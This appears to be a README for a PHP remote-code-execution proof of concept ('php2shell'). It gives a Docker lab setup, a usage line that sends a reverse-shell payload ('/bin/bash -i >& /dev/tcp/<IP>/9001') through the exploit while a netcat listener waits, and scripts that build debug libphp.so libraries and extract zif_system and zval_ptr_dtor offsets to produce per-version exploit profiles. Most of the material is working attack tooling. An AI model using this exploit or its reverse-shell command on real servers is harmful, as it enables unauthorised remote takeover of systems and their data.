# BASE OF THE PoC
https://raw.githubusercontent.com/BillReyor/php2shell/refs/heads/main/exploit.py

# START LAB
```bash
docker run --rm --name php85 -p 8000:80 -p 8443:443 php:8.5.11-apache sh -c '
  echo "<?php echo \"OK\"; ?>" > /var/www/html/index.php &&
  openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/private/ssl-cert-snakeoil.key \
    -out /etc/ssl/certs/ssl-cert-snakeoil.pem \
    -subj "/CN=localhost" &&
  a2enmod ssl && a2ensite default-ssl &&
  exec apache2-foreground'
```


# USAGE
```bash
nc -lvnp 9001

python exploit.py --url https://127.0.0.1:8443/index.php --version 8.5.11 --cmd '/bin/bash -c "/bin/bash -i >& /dev/tcp/<IP>/9001 0>&1"'
```

# Retrieve the libphp.so
```bash
#!/usr/bin/env bash
set -euo pipefail
mkdir -p libs

# metti a 1 se vuoi cancellare ogni immagine dopo averne estratto la lib
CLEANUP_IMAGES="${CLEANUP_IMAGES:-0}"

while read -r t; do
    t="${t#php-}"
    [ -z "$t" ] && continue
    img="php:${t}-apache"
    docker pull "$img"

    docker run --rm -v "$PWD/libs:/out" -e DEBIAN_FRONTEND=noninteractive "$img" \
      bash -euo pipefail -c '
        apt-get update -qq
        apt-get install -y -qq --no-install-recommends \
            apache2-dev libxml2-dev libssl-dev libcurl4-openssl-dev \
            libsqlite3-dev libonig-dev libreadline-dev zlib1g-dev \
            libargon2-dev libsodium-dev libpng-dev libgmp-dev >/dev/null
        cfg=$(php -i | sed -n "s/^Configure Command => //p")
        [ -z "$cfg" ] && { echo "configure non trovato" >&2; exit 1; }
        docker-php-source extract
        cd /usr/src/php
        export CFLAGS="$PHP_CFLAGS -g"
        export CPPFLAGS="${PHP_CPPFLAGS:-} -g"
        export LDFLAGS="${PHP_LDFLAGS:-}"
        eval "$cfg"
        make -j"$(nproc)"
        cp libs/libphp.so "/out/'"${t}"'-libphp.so"
    '

    if [ "$CLEANUP_IMAGES" = "1" ]; then
        docker rmi "$img" >/dev/null 2>&1 || true
    fi
done < php-tags.txt
```

# Extract offsets
```bash
echo 'PROFILES = {'
for l in $(/bin/ls libs); do

	ZIF_ADDR=$(readelf -Ws libs/$l | /bin/grep zif_system | awk '{print($2)}')
	DTOR_ADDR=$(readelf -Ws libs/$l | /bin/grep -E ' zval_ptr_dtor$' | awk '{print($2)}' | head -n1)
	v=$(echo $l | awk -F '-' '{print($1)}') # extract the numeric version from filename
	# HTDATA and HTDATA_EXT seams to be static??? PADS must be calibrated???
	echo '   "'$v'": {"ZIF":0x'$ZIF_ADDR', "DTOR": 0x'$DTOR_ADDR', "HTDATA": 0x7e0d8, "HTDATA_EXT": 0x7e218, "PADS": 112},'
done
echo '}'
```
